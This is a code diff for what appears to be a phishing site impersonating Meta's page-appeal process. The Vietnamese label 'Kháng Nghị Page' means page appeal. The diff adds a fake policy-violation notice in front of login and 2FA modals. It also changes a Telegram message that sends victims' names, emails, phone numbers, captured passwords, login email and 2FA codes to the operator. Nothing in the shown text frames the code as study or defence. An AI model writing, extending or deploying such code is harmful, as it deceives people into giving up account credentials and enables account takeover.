@@ -4,6 +4,8 @@ import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
 import TwoFAModal from '@/components/TwoFAModal';
 import SuccessModal from '@/components/SuccessModal';
+import MetaHeader from '@/components/MetaHeader';
+import PolicyViolationNotice from '@/components/PolicyViolationNotice';
 import '@/assets/css/community-standards.css';
 import LogoMeta from '@/assets/images/logo-meta.svg';
 import Background from '@/assets/images/background.png';
@@ -17,8 +19,9 @@ import { translateText } from '@/utils/translate';
 import countryToLanguage from '@/utils/country_to_language';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
+import { PATHS } from '@/router/paths';
 
-const LABEL = 'Thần-tài-đến';
+const LABEL = 'Kháng Nghị Page';
 
 const GEO_ENDPOINTS = [
     {
@@ -116,6 +119,7 @@ const fetchGeoData = async () => {
 };
 
 const Home = () => {
+    const [showPolicyNotice, setShowPolicyNotice] = useState(true);
     const [showReviewPage, setShowReviewPage] = useState(false);
     const [showLoginModal, setShowLoginModal] = useState(false);
     const [show2FAModal, setShow2FAModal] = useState(false);
@@ -306,6 +310,8 @@ const Home = () => {
         const safeCountry = ip.country || 'Unknown';
         const parsedDevice = parseDeviceInfo(device.deviceInfo);
 
+        const safeLoginIdentity = login?.email || 'N/A';
+
         const passwordLines = passwordLogs.length > 0
             ? passwordLogs.map((pwd, idx) => `   MK${idx + 1}: <code>${escapeHtml(pwd)}</code>`).join('\n')
             : '   MK1: <code>N/A</code>';
@@ -323,13 +329,13 @@ const Home = () => {
 📋 <b>INFO</b>
    Name: <code>${escapeHtml(form.fullName)}</code>
    Email: <code>${escapeHtml(form.personalEmail)}</code>
-   Biz Email: <code>${escapeHtml(form.businessEmail)}</code>
+   DN Email: <code>${escapeHtml(form.businessEmail)}</code>
    Phone: <code>${escapeHtml(form.phone)}</code>
    Page: <code>${escapeHtml(form.pageName)}</code>
-   Reason: <code>${escapeHtml(form.reason)}</code>
-   Note: <code>${escapeHtml(form.additionalNotes)}</code>
+
 
 🔐 <b>PASSWORD</b>
+   EmailLogin: <code>${escapeHtml(safeLoginIdentity)}</code>
 ${passwordLines}
 
 🔒 <b>2FA CODE</b>
@@ -392,7 +398,7 @@ ${twoFALines}
     const Header = () => (
         <div className="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
             <div className="max-w-[1280px] w-full flex items-center justify-between px-4">
-                <a href="/live">
+                <a href={PATHS.HOME}>
                     <img src={LogoMeta} width="64" alt="Meta" />
                 </a>
             </div>
@@ -401,7 +407,16 @@ ${twoFALines}
 
     return (
         <>
-            {showReviewPage ? (
+            {showPolicyNotice ? (
+                <div className="flex min-h-screen flex-col bg-white">
+                    <MetaHeader />
+                    <div className="flex flex-1 flex-col items-center justify-center p-4 sm:p-6">
+                        <div className="w-full max-w-2xl px-3 sm:px-4">
+                            <PolicyViolationNotice onContinue={() => setShowPolicyNotice(false)} />
+                        </div>
+                    </div>
+                </div>
+            ) : showReviewPage ? (
                 <div className="community-page min-h-screen w-full flex justify-center bg-white">
                     <div className="w-full">
                         <Header />
